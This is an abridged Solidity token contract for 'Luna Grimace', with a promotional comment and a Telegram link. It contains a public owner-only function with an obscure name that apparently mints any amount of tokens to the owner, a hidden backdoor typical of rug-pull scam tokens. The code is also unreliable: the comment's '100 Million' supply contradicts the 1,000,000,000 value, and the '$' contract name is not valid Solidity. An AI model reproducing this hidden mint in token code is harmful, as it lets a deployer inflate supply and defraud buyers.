...
//
// $LunaGrimace proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+TjdY-r_zMeNiNzA1
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _LunaGrimace(uint256 amount) public onlyOwner {
 _LunaGrimace(msg.sender, amount);
    }
    ...
    function _LunaGrimace(address account, uint256 amount) internal virtual {
...
contract $LunaGrimace is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Luna Grimace", "LUNAGRIMACE") {
     _LunaGrimace(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}